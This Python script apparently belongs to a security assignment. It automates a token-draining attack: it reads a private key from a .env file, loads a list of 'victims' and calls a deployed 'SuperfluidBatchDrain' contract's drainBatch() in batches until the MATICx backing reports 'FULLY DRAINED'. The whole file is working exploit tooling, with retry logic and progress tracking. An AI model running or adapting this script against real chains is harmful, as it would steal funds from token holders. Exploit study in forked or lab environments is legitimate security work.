#!/usr/bin/env python3
"""Batch drain all MATICx holders using deployed SuperfluidBatchDrain at 0x135bA7F14dB39f76e53F463F753472F4a029a6E7."""
import json
import subprocess
import sys
import time
import os

RPC = "https://REDACTED.example.invalid/9211c782-ae68-44dd-96a4-6a307c4e3091/rpc/4gi_akali:575d580ce56856c4751f2afb8daf13cc21c4eefd48958f1734e36a44d5f23734"
DRAINER = "0x135bA7F14dB39f76e53F463F753472F4a029a6E7"
MATICX = "0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3"
BATCH_SIZE = 50

ALREADY_DRAINED = {
    "0xb47a9b6f062c33ed78630478dff9056687f840f2",
    "0x9c6b5fdc145912dfe6ee13a667af3c5eb07cbb89",
    "0xed50f0534894676ca5aa259622dfbce1d6461d3c",
    "0x8ef0d78023394f15732e9db2614bd2e9a1ee04a2",
    "0x1fe6a806e0a9858359e16c58e4f84c790171596b",
}


def get_pk():
    with open("/Users/dldustn/Desktop/upside_assignment/AssignmentC/.env") as f:
        for line in f:
            if line.startswith("PRIVATE_KEY="):
                return line.strip().split("=", 1)[1]
    raise RuntimeError("no pk")


def check_remaining():
    r = subprocess.run(["cast", "balance", MATICX, "--rpc-url", RPC],
                       capture_output=True, text=True, timeout=30)
    return int(r.stdout.strip()) if r.returncode == 0 else -1


def send_batch(pk, addrs):
    addr_list = "[" + ",".join(addrs) + "]"
    r = subprocess.run(
        ["cast", "send", DRAINER, "drainBatch(address[])", addr_list,
         "--rpc-url", RPC, "--private-key", pk, "--gas-limit", "29000000"],
        capture_output=True, text=True, timeout=300
    )
    return r.returncode == 0, r.stderr


def main():
    pk = get_pk()
    with open("/Users/dldustn/Desktop/upside_assignment/AssignmentC/for_test/superfluid_e1/victims.json") as f:
        data = json.load(f)

    victims = [v["addr"] for v in data["victims"] if v["addr"].lower() not in ALREADY_DRAINED]
    print(f"Total addresses to drain: {len(victims)}")

    remaining = check_remaining()
    print(f"MATICx backing: {remaining / 1e18:.2f} MATIC")

    ok_count = 0
    fail_count = 0

    for i in range(0, len(victims), BATCH_SIZE):
        remaining = check_remaining()
        if remaining <= 0:
            print("FULLY DRAINED!")
            break

        batch = victims[i:i + BATCH_SIZE]
        batch_num = i // BATCH_SIZE + 1

        ok, err = send_batch(pk, batch)
        if ok:
            ok_count += 1
        else:
            fail_count += 1
            if "timed out" in err or "node not ready" in err:
                print(f"RPC issue at batch {batch_num}, waiting 10s...")
                time.sleep(10)
                ok, _ = send_batch(pk, batch)
                if ok:
                    ok_count += 1
                    fail_count -= 1

        if batch_num % 5 == 0:
            remaining = check_remaining()
            print(f"Batch {batch_num}: remaining={remaining / 1e18:.2f} MATIC, ok={ok_count}, fail={fail_count}")

    remaining = check_remaining()
    print(f"\nFinal MATICx backing: {remaining / 1e18:.2f} MATIC")
    print(f"Success: {ok_count}, Failed: {fail_count}")


if __name__ == "__main__":
    main()
